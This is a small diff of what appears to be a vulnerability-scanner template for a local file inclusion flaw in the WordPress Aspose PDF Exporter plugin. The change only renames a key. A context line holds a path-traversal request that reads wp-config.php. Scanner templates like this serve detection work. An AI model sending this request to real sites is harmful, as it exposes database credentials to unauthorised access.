@@ -10,7 +10,7 @@ info:
     - https://wordpress.org/plugins/aspose-pdf-exporter
   tags: wordpress,wp-plugin,lfi,aspose
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/Wordpress/Aaspose-pdf-exporter/aspose_pdf_exporter_download.php?file=../../../wp-config.php'
